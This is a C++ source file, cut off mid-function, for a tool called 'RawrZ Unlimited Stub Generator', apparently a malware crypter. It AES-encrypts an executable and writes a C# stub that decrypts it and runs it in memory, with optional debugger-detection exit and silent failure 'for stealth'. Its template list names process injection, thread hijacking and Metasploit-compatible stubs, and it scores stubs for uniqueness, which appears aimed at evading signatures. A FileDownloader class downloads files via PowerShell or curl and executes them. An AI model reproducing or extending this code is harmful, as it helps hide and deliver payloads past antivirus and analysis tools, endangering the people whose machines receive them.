#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <filesystem>
#include <limits>
#include <windows.h>
#include <set>
#include <map>
#include <cmath>

// OpenSSL includes for real crypto
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/des.h>
#include <openssl/rand.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <openssl/bio.h>
#include <openssl/err.h>

// Windows API for drag and drop
#include <shellapi.h>
#include <commctrl.h>

// Configuration structure for persistence
struct RawrZConfig {
    bool useOpenSSL = true;  // OpenSSL is enabled in this build
    bool useEnhancedEncryption = true;
    bool useAntiAnalysis = true;
    bool useStealth = true;
    std::string defaultOutputDir = "./output/";
    std::string logFile = "./rawrz_openssl.log";
    int encryptionRounds = 3;
    bool verboseLogging = true;
};

// Global configuration
RawrZConfig g_config;

// OpenSSL initialization function
void initializeOpenSSL() {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    RAND_poll(); // Seed the random number generator
}

// OpenSSL cleanup function
void cleanupOpenSSL() {
    EVP_cleanup();
    ERR_free_strings();
}

// Enhanced Unlimited Stub Generator Class Declaration with OpenSSL
class RawrZUnlimitedStubGenerator {
private:
    std::string currentKey;
    std::string currentIV;
    std::vector<std::string> stubTemplates;
    
public:
    RawrZUnlimitedStubGenerator() {
        initializeTemplates();
        generateNewKeys();
    }
    
    void initializeTemplates();
    void generateNewKeys();
    std::string generateRandomString(size_t length, bool cryptoSecure = false);
    std::vector<unsigned char> encryptWithAES(const std::vector<unsigned char>& data);
    std::string base64Encode(const std::vector<unsigned char>& data);
    std::string generateCSharpAESStub(const std::vector<std::string>& chunks, bool addAntiAnalysis = false);
    bool generateAndAttachStub(const std::string& targetFile, const std::string& stubType, bool addAntiAnalysis = false);
    void showStubTypes();
    std::string getStubType(int index);
    
    // New enhanced features
    void compareStubs(const std::string& stub1Path, const std::string& stub2Path);
    void batchGenerateStubs(const std::vector<std::string>& targetFiles, const std::string& stubType, bool addAntiAnalysis);
    void selectStubAndExe();
    std::string analyzeStubRandomness(const std::string& stubPath);
    double calculateStubSimilarity(const std::string& stub1, const std::string& stub2);
    
    // Enhanced analysis helper methods
    size_t calculateLevenshteinDistance(const std::string& s1, const std::string& s2);
    std::string compressString(const std::string& input);
    
    // Drag and drop support
    bool processDroppedFile(const std::string& filePath);
    void interactiveStubGeneration(const std::string& exePath);
    
    // File handling utilities
    std::vector<unsigned char> readFile(const std::string& filePath);
};

// Unlimited Stub Generator Implementation with OpenSSL
void RawrZUnlimitedStubGenerator::initializeTemplates() {
    stubTemplates = {
        "C#_AES_256_CBC",
        "C#_XOR_Enhanced", 
        "C#_Triple_Layer",
        "C#_Hybrid_Mixed",
        "C#_Anti_Debug",
        "C#_Anti_VM",
        "C#_Anti_Analysis",
        "C#_Polymorphic",
        "C#_Metasploit_Compatible",
        "C#_PowerShell_Embedded",
        "C#_Reflection_Loader",
        "C#_Assembly_Loader",
        "C#_Memory_Loader",
        "C#_Process_Injection",
        "C#_Thread_Hijacking"
    };
}

void RawrZUnlimitedStubGenerator::generateNewKeys() {
    // Use OpenSSL for cryptographically secure random generation
    std::vector<unsigned char> keyBytes(32);  // 256-bit key
    std::vector<unsigned char> ivBytes(16);   // 128-bit IV
    
    if (RAND_bytes(keyBytes.data(), keyBytes.size()) != 1) {
        throw std::runtime_error("Failed to generate random key");
    }
    if (RAND_bytes(ivBytes.data(), ivBytes.size()) != 1) {
        throw std::runtime_error("Failed to generate random IV");
    }
    
    // Convert to hex strings for storage
    std::stringstream keyStream, ivStream;
    for (auto byte : keyBytes) {
        keyStream << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
    }
    for (auto byte : ivBytes) {
        ivStream << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
    }
    
    currentKey = keyStream.str();
    currentIV = ivStream.str();
}

std::string RawrZUnlimitedStubGenerator::generateRandomString(size_t length, bool cryptoSecure) {
    std::string result;
    result.reserve(length);
    
    if (cryptoSecure) {
        // Use OpenSSL for cryptographically secure random
        std::vector<unsigned char> randomBytes(length);
        if (RAND_bytes(randomBytes.data(), length) == 1) {
            const char* charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            for (auto byte : randomBytes) {
                result += charset[byte % 62];
            }
        } else {
            throw std::runtime_error("Failed to generate cryptographically secure random bytes");
        }
    } else {
        // Standard random generation
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(33, 126);
        for (size_t i = 0; i < length; ++i) {
            result += static_cast<char>(dis(gen));
        }
    }
    
    return result;
}

// Real AES-256-CBC encryption using OpenSSL
std::vector<unsigned char> RawrZUnlimitedStubGenerator::encryptWithAES(const std::vector<unsigned char>& data) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        throw std::runtime_error("Failed to create EVP_CIPHER_CTX");
    }

    std::vector<unsigned char> ciphertext(data.size() + EVP_MAX_BLOCK_LENGTH);
    int len = 0;
    int ciphertext_len = 0;

    try {
        // Convert hex strings back to bytes
        std::vector<unsigned char> keyBytes, ivBytes;
        for (size_t i = 0; i < currentKey.length(); i += 2) {
            keyBytes.push_back(std::stoi(currentKey.substr(i, 2), nullptr, 16));
        }
        for (size_t i = 0; i < currentIV.length(); i += 2) {
            ivBytes.push_back(std::stoi(currentIV.substr(i, 2), nullptr, 16));
        }

        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, keyBytes.data(), ivBytes.data()) != 1) {
            throw std::runtime_error("Failed to initialize encryption");
        }

        if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, data.data(), data.size()) != 1) {
            throw std::runtime_error("Failed to encrypt data");
        }
        ciphertext_len = len;

        if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
            throw std::runtime_error("Failed to finalize encryption");
        }
        ciphertext_len += len;

        ciphertext.resize(ciphertext_len);
        EVP_CIPHER_CTX_free(ctx);
        return ciphertext;
    } catch (...) {
        EVP_CIPHER_CTX_free(ctx);
        throw;
    }
}

// Real Base64 encoding using OpenSSL BIO
std::string RawrZUnlimitedStubGenerator::base64Encode(const std::vector<unsigned char>& data) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    
    BIO_write(bio, data.data(), data.size());
    BIO_flush(bio);
    
    char* encodedData;
    long encodedSize = BIO_get_mem_data(bio, &encodedData);
    std::string result(encodedData, encodedSize);
    
    BIO_free_all(bio);
    return result;
}

// Generate C# AES stub with real encryption
std::string RawrZUnlimitedStubGenerator::generateCSharpAESStub(const std::vector<std::string>& chunks, bool addAntiAnalysis) {
    std::stringstream stub;
    
    stub << "using System;\n";
    stub << "using System.Text;\n";
    stub << "using System.Collections.Generic;\n";
    stub << "using System.Security.Cryptography;\n";
    stub << "using System.IO;\n";
    stub << "using System.Reflection;\n";
    stub << "using System.Runtime.InteropServices;\n\n";
    
    if (addAntiAnalysis) {
        stub << "// Anti-Analysis Features\n";
        stub << "[DllImport(\"kernel32.dll\")]\n";
        stub << "static extern bool IsDebuggerPresent();\n\n";
    }
    
    stub << "public class Program {\n";
    stub << "    public static void Main() {\n";
    
    if (addAntiAnalysis) {
        stub << "        // Anti-Debug Check\n";
        stub << "        if (IsDebuggerPresent()) {\n";
        stub << "            Environment.Exit(0);\n";
        stub << "        }\n\n";
    }
    
    stub << "        try {\n";
    stub << "            // Decryption key and IV (OpenSSL generated)\n";
    stub << "            string key = \"" << currentKey << "\";\n";
    stub << "            string iv = \"" << currentIV << "\";\n\n";
    
    stub << "            // Encrypted payload chunks\n";
    stub << "            List<string> chunks = new List<string>();\n";
    
    for (size_t i = 0; i < chunks.size(); i++) {
        stub << "            chunks.Add(\"" << chunks[i] << "\");\n";
    }
    
    stub << "\n";
    stub << "            // Reconstruct and decrypt payload\n";
    stub << "            string encrypted = string.Join(\"\", chunks);\n";
    stub << "            byte[] payload = DecryptAES(encrypted, key, iv);\n\n";
    
    stub << "            // Load and execute payload\n";
    stub << "            Assembly assembly = Assembly.Load(payload);\n";
    stub << "            MethodInfo mainMethod = assembly.EntryPoint;\n";
    stub << "            if (mainMethod != null) {\n";
    stub << "                mainMethod.Invoke(null, null);\n";
    stub << "            }\n";
    stub << "        } catch (Exception ex) {\n";
    stub << "            // Silent failure for stealth\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    stub << "    static byte[] DecryptAES(string encryptedData, string key, string iv) {\n";
    stub << "        using (Aes aes = Aes.Create()) {\n";
    stub << "            aes.Key = HexStringToByteArray(key);\n";
    stub << "            aes.IV = HexStringToByteArray(iv);\n";
    stub << "            aes.Mode = CipherMode.CBC;\n";
    stub << "            aes.Padding = PaddingMode.PKCS7;\n\n";
    
    stub << "            using (ICryptoTransform decryptor = aes.CreateDecryptor()) {\n";
    stub << "                byte[] encryptedBytes = Convert.FromBase64String(encryptedData);\n";
    stub << "                using (MemoryStream ms = new MemoryStream(encryptedBytes)) {\n";
    stub << "                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {\n";
    stub << "                        using (MemoryStream result = new MemoryStream()) {\n";
    stub << "                            cs.CopyTo(result);\n";
    stub << "                            return result.ToArray();\n";
    stub << "                        }\n";
    stub << "                    }\n";
    stub << "                }\n";
    stub << "            }\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    stub << "    static byte[] HexStringToByteArray(string hex) {\n";
    stub << "        int numberChars = hex.Length;\n";
    stub << "        byte[] bytes = new byte[numberChars / 2];\n";
    stub << "        for (int i = 0; i < numberChars; i += 2) {\n";
    stub << "            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);\n";
    stub << "        }\n";
    stub << "        return bytes;\n";
    stub << "    }\n";
    stub << "}\n";
    
    return stub.str();
}

// Generate and attach stub with real OpenSSL encryption
bool RawrZUnlimitedStubGenerator::generateAndAttachStub(const std::string& targetFile, const std::string& stubType, bool addAntiAnalysis) {
    try {
        // Read target file
        std::ifstream file(targetFile, std::ios::binary);
        if (!file) {
            std::cerr << "Error: Cannot open target file!" << std::endl;
            return false;
        }
        
        std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Encrypt file data using OpenSSL AES
        auto encrypted = encryptWithAES(fileData);
        std::string base64Data = base64Encode(encrypted);
        
        // Split into chunks
        std::vector<std::string> chunks;
        for (size_t i = 0; i < base64Data.size(); i += 100) {
            chunks.push_back(base64Data.substr(i, 100));
        }
        
        // Generate appropriate stub
        std::string stubCode;
        if (stubType == "AES_256_CBC") {
            stubCode = generateCSharpAESStub(chunks, addAntiAnalysis);
        } else {
            stubCode = generateCSharpAESStub(chunks, addAntiAnalysis); // Default to AES
        }
        
        // Save stub to file
        std::string stubFileName = targetFile + ".stub.cs";
        std::ofstream stubFile(stubFileName);
        if (stubFile) {
            stubFile << stubCode;
            stubFile.close();
            std::cout << "[SUCCESS] Stub generated successfully: " << stubFileName << std::endl;
            std::cout << "OpenSSL AES Key: " << currentKey << std::endl;
            std::cout << "OpenSSL AES IV: " << currentIV << std::endl;
        }
        
        return true;
        
    } catch (const std::exception& e) {
        std::cerr << "Error generating stub: " << e.what() << std::endl;
        return false;
    }
}

// Enhanced stub analysis implementation with comprehensive statistical tests
std::string RawrZUnlimitedStubGenerator::analyzeStubRandomness(const std::string& stubContent) {
    if (stubContent.empty()) {
        return "EMPTY (No content to analyze)";
    }

    // 1. Character diversity analysis
    std::set<char> uniqueChars(stubContent.begin(), stubContent.end());
    double charDiversity = (double)uniqueChars.size() / 128.0;
    
    // 2. Pattern detection (repeated sequences)
    int patternCount = 0;
    const int patternLength = std::min(10, (int)stubContent.length() / 10);
    for (size_t i = 0; i < stubContent.length() - patternLength; i++) {
        std::string pattern = stubContent.substr(i, patternLength);
        if (stubContent.find(pattern, i + 1) != std::string::npos) {
            patternCount++;
        }
    }
    double patternRatio = (double)patternCount / stubContent.length();
    
    // 3. Entropy calculation
    double entropy = 0.0;
    std::map<char, int> charCount;
    for (char c : stubContent) {
        charCount[c]++;
    }
    
    for (const auto& pair : charCount) {
        double p = (double)pair.second / stubContent.length();
        if (p > 0) {
            entropy -= p * log2(p);
        }
    }
    double normalizedEntropy = entropy / 7.0; // max is log2(128) = 7
    
    // 4. Frequency analysis (monobit test)
    int ones = 0;
    for (char c : stubContent) {
        if (c & 0x80) ones++; // Count high bits
    }
    double monobitRatio = (double)ones / (stubContent.length() * 8);
    double monobitDeviation = std::abs(monobitRatio - 0.5);
    
    // 5. Run test (count bit transitions)
    int transitions = 0;
    unsigned char prevByte = stubContent[0];
    for (size_t i = 1; i < stubContent.length(); i++) {
        unsigned char currentByte = stubContent[i];
        transitions += __builtin_popcount(prevByte ^ currentByte);
        prevByte = currentByte;
    }
    double avgTransitionsPerByte = (double)transitions / stubContent.length();
    
    // 6. Chi-squared test for uniform distribution
    double chiSquared = 0.0;
    double expected = stubContent.length() / 128.0;
    for (const auto& pair : charCount) {
        double observed = pair.second;
        chiSquared += std::pow(observed - expected, 2) / expected;
    }
    double chiSquaredNormalized = 1.0 - std::min(chiSquared / 1000.0, 1.0);
    
    // 7. Compression ratio estimation (random data doesn't compress well)
    std::string compressed;
    try {
        compressed = compressString(stubContent);
    } catch (...) {
        compressed = stubContent; // Fallback
    }
    double compressionRatio = (double)compressed.length() / stubContent.length();
    
    // Weighted randomness score
    double randomnessScore = (
        charDiversity * 0.15 +
        (1.0 - patternRatio) * 0.20 +
        normalizedEntropy * 0.25 +
        (1.0 - monobitDeviation * 2.0) * 0.15 +
        (avgTransitionsPerByte / 4.0) * 0.10 + // Normalize to 0-1 (max 4 transitions/byte)
        chiSquaredNormalized * 0.10 +
        (1.0 - compressionRatio) * 0.05
    );
    
    randomnessScore = std::max(0.0, std::min(1.0, randomnessScore));
    
    // Generate detailed report
    std::stringstream report;
    report << "RANDOMNESS ANALYSIS REPORT:\n";
    report << "==========================\n";
    report << "Character Diversity: " << std::fixed << std::setprecision(2) << (charDiversity * 100) << "%\n";
    report << "Pattern Ratio: " << (patternRatio * 100) << "%\n";
    report << "Normalized Entropy: " << (normalizedEntropy * 100) << "%\n";
    report << "Monobit Deviation: " << (monobitDeviation * 100) << "%\n";
    report << "Avg Bit Transitions/Byte: " << avgTransitionsPerByte << "\n";
    report << "Chi-Squared Score: " << chiSquared << "\n";
    report << "Compression Ratio: " << (compressionRatio * 100) << "%\n";
    report << "Overall Randomness Score: " << (randomnessScore * 100) << "%\n\n";
    
    if (randomnessScore > 0.85) report << "VERDICT: EXCELLENT (Highly Random)";
    else if (randomnessScore > 0.70) report << "VERDICT: GOOD (Mostly Random)";
    else if (randomnessScore > 0.55) report << "VERDICT: MODERATE (Some Patterns)";
    else if (randomnessScore > 0.40) report << "VERDICT: WEAK (Predictable)";
    else report << "VERDICT: POOR (Highly Predictable)";
    
    return report.str();
}

// Calculate similarity between two stubs using multiple algorithms
double RawrZUnlimitedStubGenerator::calculateStubSimilarity(const std::string& stub1, const std::string& stub2) {
    if (stub1.empty() || stub2.empty()) {
        return 0.0;
    }
    
    // 1. Longest Common Subsequence (structural similarity)
    size_t len1 = stub1.length();
    size_t len2 = stub2.length();
    
    std::vector<std::vector<size_t>> dp(len1 + 1, std::vector<size_t>(len2 + 1, 0));
    
    for (size_t i = 1; i <= len1; i++) {
        for (size_t j = 1; j <= len2; j++) {
            if (stub1[i-1] == stub2[j-1]) {
                dp[i][j] = dp[i-1][j-1] + 1;
            } else {
                dp[i][j] = std::max(dp[i-1][j], dp[i][j-1]);
            }
        }
    }
    size_t lcs = dp[len1][len2];
    double lcsSimilarity = (double)lcs / std::max(len1, len2);
    
    // 2. Jaccard similarity (character set similarity)
    std::set<char> set1(stub1.begin(), stub1.end());
    std::set<char> set2(stub2.begin(), stub2.end());
    
    std::set<char> intersection;
    std::set_intersection(set1.begin(), set1.end(), 
                         set2.begin(), set2.end(),
                         std::inserter(intersection, intersection.begin()));
    
    std::set<char> union_set;
    std::set_union(set1.begin(), set1.end(),
                  set2.begin(), set2.end(),
                  std::inserter(union_set, union_set.begin()));
    
    double jaccardSimilarity = union_set.empty() ? 0.0 : 
        (double)intersection.size() / union_set.size();
    
    // 3. Cosine similarity (character frequency similarity)
    std::map<char, int> freq1, freq2;
    for (char c : stub1) freq1[c]++;
    for (char c : stub2) freq2[c]++;
    
    double dotProduct = 0.0, norm1 = 0.0, norm2 = 0.0;
    for (const auto& pair : freq1) {
        dotProduct += pair.second * freq2[pair.first];
        norm1 += pair.second * pair.second;
    }
    for (const auto& pair : freq2) {
        norm2 += pair.second * pair.second;
    }
    
    double cosineSimilarity = (norm1 == 0 || norm2 == 0) ? 0.0 :
        dotProduct / (sqrt(norm1) * sqrt(norm2));
    
    // 4. Edit distance (Levenshtein distance)
    size_t editDistance = calculateLevenshteinDistance(stub1, stub2);
    double editSimilarity = 1.0 - (double)editDistance / std::max(len1, len2);
    
    // Weighted combination of similarity measures
    double overallSimilarity = (
        lcsSimilarity * 0.35 +
        jaccardSimilarity * 0.20 +
        cosineSimilarity * 0.25 +
        editSimilarity * 0.20
    );
    
    return std::max(0.0, std::min(1.0, overallSimilarity));
}

// Helper function for Levenshtein distance
size_t RawrZUnlimitedStubGenerator::calculateLevenshteinDistance(const std::string& s1, const std::string& s2) {
    const size_t len1 = s1.size(), len2 = s2.size();
    std::vector<std::vector<size_t>> d(len1 + 1, std::vector<size_t>(len2 + 1));
    
    for (size_t i = 0; i <= len1; ++i) d[i][0] = i;
    for (size_t j = 0; j <= len2; ++j) d[0][j] = j;
    
    for (size_t i = 1; i <= len1; ++i) {
        for (size_t j = 1; j <= len2; ++j) {
            d[i][j] = std::min({ d[i-1][j] + 1, d[i][j-1] + 1, 
                                d[i-1][j-1] + (s1[i-1] == s2[j-1] ? 0 : 1) });
        }
    }
    return d[len1][len2];
}

// Simple string compression for randomness estimation
std::string RawrZUnlimitedStubGenerator::compressString(const std::string& input) {
    // Simple run-length encoding for compression estimation
    std::string compressed;
    size_t i = 0;
    while (i < input.length()) {
        char current = input[i];
        size_t count = 1;
        while (i + count < input.length() && input[i + count] == current && count < 255) {
            count++;
        }
        compressed += current;
        compressed += static_cast<char>(count);
        i += count;
    }
    return compressed;
}

// Placeholder implementations for other methods
void RawrZUnlimitedStubGenerator::showStubTypes() {
    std::cout << "Available Stub Types:\n";
    for (size_t i = 0; i < stubTemplates.size(); i++) {
        std::cout << i + 1 << ". " << stubTemplates[i] << "\n";
    }
}

std::string RawrZUnlimitedStubGenerator::getStubType(int index) {
    if (index >= 0 && index < (int)stubTemplates.size()) {
        return stubTemplates[index];
    }
    return "AES_256_CBC"; // Default
}

void RawrZUnlimitedStubGenerator::compareStubs(const std::string& stub1Path, const std::string& stub2Path) {
    std::cout << "\n=== STUB COMPARISON ===" << std::endl;
    
    if (!std::filesystem::exists(stub1Path) || !std::filesystem::exists(stub2Path)) {
        std::cout << "[ERROR] One or both stub files not found!" << std::endl;
        return;
    }
    
    try {
        // Read both stub files
        std::ifstream file1(stub1Path);
        std::ifstream file2(stub2Path);
        
        if (!file1.is_open() || !file2.is_open()) {
            std::cout << "[ERROR] Could not open stub files for comparison!" << std::endl;
            return;
        }
        
        std::string stub1((std::istreambuf_iterator<char>(file1)), std::istreambuf_iterator<char>());
        std::string stub2((std::istreambuf_iterator<char>(file2)), std::istreambuf_iterator<char>());
        
        file1.close();
        file2.close();
        
        // Calculate similarity
        double similarity = calculateStubSimilarity(stub1, stub2);
        
        std::cout << "Stub 1: " << stub1Path << " (" << stub1.length() << " bytes)" << std::endl;
        std::cout << "Stub 2: " << stub2Path << " (" << stub2.length() << " bytes)" << std::endl;
        std::cout << "Similarity: " << std::fixed << std::setprecision(2) << (similarity * 100) << "%" << std::endl;
        
        if (similarity < 0.1) {
            std::cout << "VERDICT: EXCELLENT (Highly Unique Stubs)" << std::endl;
        } else if (similarity < 0.3) {
            std::cout << "VERDICT: GOOD (Mostly Unique Stubs)" << std::endl;
        } else if (similarity < 0.6) {
            std::cout << "VERDICT: MODERATE (Some Similarity)" << std::endl;
        } else {
            std::cout << "VERDICT: POOR (Highly Similar Stubs)" << std::endl;
        }
        
        // Analyze randomness of both stubs
        std::cout << "\n=== STUB 1 RANDOMNESS ANALYSIS ===" << std::endl;
        std::cout << analyzeStubRandomness(stub1) << std::endl;
        
        std::cout << "\n=== STUB 2 RANDOMNESS ANALYSIS ===" << std::endl;
        std::cout << analyzeStubRandomness(stub2) << std::endl;
        
    } catch (const std::exception& e) {
        std::cout << "[ERROR] Comparison failed: " << e.what() << std::endl;
    }
}

void RawrZUnlimitedStubGenerator::batchGenerateStubs(const std::vector<std::string>& targetFiles, const std::string& stubType, bool addAntiAnalysis) {
    std::cout << "\n=== BATCH STUB GENERATION ===" << std::endl;
    
    if (targetFiles.empty()) {
        std::cout << "Enter target files (one per line, empty line to finish):" << std::endl;
        std::vector<std::string> files;
        std::string filePath;
        
        while (std::getline(std::cin, filePath) && !filePath.empty()) {
            if (std::filesystem::exists(filePath)) {
                files.push_back(filePath);
            } else {
                std::cout << "[WARNING] File not found: " << filePath << std::endl;
            }
        }
        
        if (files.empty()) {
            std::cout << "No valid files provided for batch processing." << std::endl;
            return;
        }
        
        // Process the collected files
        batchGenerateStubs(files, stubType, addAntiAnalysis);
        return;
    }
    
    std::cout << "Processing " << targetFiles.size() << " files..." << std::endl;
    
    int successCount = 0;
    for (const auto& targetFile : targetFiles) {
        std::cout << "\nProcessing: " << targetFile << std::endl;
        
        if (!std::filesystem::exists(targetFile)) {
            std::cout << "[ERROR] File not found: " << targetFile << std::endl;
            continue;
        }
        
        try {
            // Generate new keys for each stub
            generateNewKeys();
            
            // Read and encrypt target file
            auto fileData = readFile(targetFile);
            auto encrypted = encryptWithAES(fileData);
            std::string base64Data = base64Encode(encrypted);
            
            // Split into chunks
            std::vector<std::string> chunks;
            for (size_t i = 0; i < base64Data.size(); i += 100) {
                chunks.push_back(base64Data.substr(i, 100));
            }
            
            // Generate stub
            std::string stubCode = generateCSharpAESStub(chunks, addAntiAnalysis);
            
            // Save stub
            std::string stubPath = targetFile + "_stub_" + std::to_string(successCount + 1) + ".cs";
            std::ofstream stubFile(stubPath);
            if (stubFile.is_open()) {
                stubFile << stubCode;
                stubFile.close();
                std::cout << "[SUCCESS] Generated: " << stubPath << std::endl;
                successCount++;
            } else {
                std::cout << "[ERROR] Could not write stub file: " << stubPath << std::endl;
            }
            
        } catch (const std::exception& e) {
            std::cout << "[ERROR] Failed to process " << targetFile << ": " << e.what() << std::endl;
        }
    }
    
    std::cout << "\n=== BATCH PROCESSING COMPLETE ===" << std::endl;
    std::cout << "Successfully generated " << successCount << " stubs out of " << targetFiles.size() << " files." << std::endl;
}

void RawrZUnlimitedStubGenerator::selectStubAndExe() {
    std::cout << "\n=== STUB & EXECUTABLE SELECTION ===" << std::endl;
    
    // Show available stub types
    std::cout << "Available Stub Types:" << std::endl;
    for (size_t i = 0; i < stubTemplates.size(); ++i) {
        std::cout << "  " << (i + 1) << ". " << stubTemplates[i] << std::endl;
    }
    
    // Get stub type selection
    int stubChoice;
    std::cout << "\nSelect stub type (1-" << stubTemplates.size() << "): ";
    std::cin >> stubChoice;
    
    if (stubChoice < 1 || stubChoice > static_cast<int>(stubTemplates.size())) {
        std::cout << "[ERROR] Invalid stub type selection!" << std::endl;
        return;
    }
    
    std::string selectedStubType = stubTemplates[stubChoice - 1];
    std::cout << "Selected: " << selectedStubType << std::endl;
    
    // Get executable path
    std::string exePath;
    std::cout << "\nEnter path to executable: ";
    std::cin.ignore(); // Clear input buffer
    std::getline(std::cin, exePath);
    
    if (exePath.empty() || !std::filesystem::exists(exePath)) {
        std::cout << "[ERROR] Invalid executable path!" << std::endl;
        return;
    }
    
    // Get anti-analysis preference
    bool addAntiAnalysis;
    std::cout << "Add anti-analysis features? (1=Yes, 0=No): ";
    std::cin >> addAntiAnalysis;
    
    // Generate stub
    std::cout << "\nGenerating stub..." << std::endl;
    if (generateAndAttachStub(exePath, selectedStubType, addAntiAnalysis)) {
        std::cout << "[SUCCESS] Stub generated successfully!" << std::endl;
        
        // Ask if user wants to compile
        bool compileStub;
        std::cout << "Compile stub to executable? (1=Yes, 0=No): ";
        std::cin >> compileStub;
        
        if (compileStub) {
            std::string stubPath = exePath + ".stub.cs";
            if (std::filesystem::exists(stubPath)) {
                std::cout << "Compiling stub..." << std::endl;
                std::string command = "csc /target:exe /out:\"" + exePath + "_stub.exe\" \"" + stubPath + "\"";
                int result = system(command.c_str());
                
                if (result == 0) {
                    std::cout << "[SUCCESS] Stub compiled successfully!" << std::endl;
                } else {
                    std::cout << "[WARNING] Compilation failed. Install .NET SDK for C# compilation." << std::endl;
                }
            }
        }
    } else {
        std::cout << "[ERROR] Stub generation failed!" << std::endl;
    }
}

// File handling utilities
std::vector<unsigned char> RawrZUnlimitedStubGenerator::readFile(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file) {
        throw std::runtime_error("Failed to open file: " + filePath);
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> fileData(fileSize);
    if (!file.read(reinterpret_cast<char*>(fileData.data()), fileSize)) {
        throw std::runtime_error("Failed to read file: " + filePath);
    }

    return fileData;
}

bool isValidExecutable(const std::string& filePath) {
    std::filesystem::path path(filePath);
    std::string extension = path.extension().string();
    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
    
    return extension == ".exe" || extension == ".dll" || extension == ".bin";
}

// Add file downloader functionality
class FileDownloader {
private:
    std::string downloadPath;
    
public:
    FileDownloader() : downloadPath("./downloads/") {
        // Create downloads directory if it doesn't exist
        std::filesystem::create_directories(downloadPath);
    }
    
    bool downloadFile(const std::string& url, const std::string& filename) {
        std::string fullPath = downloadPath + filename;
        
        // Try using PowerShell for download (Windows native)
        std::string command = "powershell -Command \"(New-Object Net.WebClient).DownloadFile('" + url + "', '" + fullPath + "')\"";
        
        std::cout << "Downloading " << filename << " from " << url << "..." << std::endl;
        int result = system(command.c_str());
        
        if (result == 0 && std::filesystem::exists(fullPath)) {
            std::cout << "[SUCCESS] Downloaded: " << fullPath << std::endl;
            return true;
        } else {
            std::cout << "[ERROR] Download failed. Trying alternative method..." << std::endl;
            
            // Alternative: Try using curl if available
            command = "curl -L -o \"" + fullPath + "\" \"" + url + "\"";
            result = system(command.c_str());
            
            if (result == 0 && std::filesystem::exists(fullPath)) {
                std::cout << "[SUCCESS] Downloaded using curl: " << fullPath << std::endl;
                return true;
            }
            
            std::cout << "[ERROR] All download methods failed!" << std::endl;
            return false;
        }
    }
    
    bool executeFile(const std::string& filename) {
        std::string fullPath = downloadPath + filename;
        
        if (!std::filesystem::exists(fullPath)) {
            std::cout << "[ERROR] File not found: " << fullPath << std::endl;
            return false;
        }
        
        std::cout << "Executing: " << fullPath << std::endl;
        std::string command = "\"" + fullPath + "\"";
        int result = system(command.c_str());
        
        if (result == 0) {
            std::cout << "[SUCCESS] File executed successfully!" << std::endl;
            return true;
        } else {
            std::cout << "[ERROR] File execution failed with code: " << result << std::endl;
            return false;
        }
    }
    
    void listDownloadedFiles() {
        std::cout << "\n=== DOWNLOADED FILES ===" << std::endl;
        if (!std::filesystem::exists(downloadPath)) {
            std::cout << "Downloads directory does not exist." << std::endl;
            return;
        }
        
        for (const auto& entry : std::filesystem::directory_iterator(downloadPath)) {
            if (entry.is_regular_file()) {
                auto fileSize = entry.file_size();
                auto modTime = std::filesystem::last_write_time(entry.path());
                
                std::cout << "  " << entry.path().filename().string() 
                         << " (" << fileSize << " bytes)" << std::endl;
            }
        }
    }
    
    std::string getDownloadPath() const { return downloadPath; }
};

// Drag and drop message handler
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static RawrZUnlimitedStubGenerator* generator = nullptr;
    
    switch (uMsg) {
        case WM_CREATE: {
            CREATESTRUCT* pCreate = reinterpret_cast<CREATESTRUCT*>(lParam);
            generator = reinterpret_cast<RawrZUnlimitedStubGenerator*>(pCreate->lpCreateParams);
            
            // Enable drag and drop
            DragAcceptFiles(hwnd, TRUE);
            return 0;
        }
        
        case WM_DROPFILES: {
            HDROP hDrop = reinterpret_cast<HDROP>(wParam);
            UINT fileCount = DragQueryFile(hDrop, 0xFFFFFFFF, nullptr, 0);
            
            for (UINT i = 0; i < fileCount; i++) {
                UINT pathLength = DragQueryFile(hDrop, i, nullptr, 0);
                std::vector<char> filePath(pathLength + 1);
                DragQueryFile(hDrop, i, filePath.data(), pathLength + 1);
                
                std::string droppedFile(filePath.data());
                std::cout << "\n[DRAG & DROP] File dropped: " << droppedFile << std::endl;
                
                if (generator && isValidExecutable(droppedFile)) {
                    generator->processDroppedFile(droppedFile);
                } else {
                    std::cout << "[ERROR] Invalid file type. Only executables (.exe, .dll, .bin) are supported." << std::endl;
                }
            }
            
            DragFinish(hDrop);
            return 0;
        }
        
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Create drag and drop window
HWND createDragDropWindow(RawrZUnlimitedStubGenerator* generator) {
    const char* className = "RawrZ_DragDrop_Window";
    
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = className;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
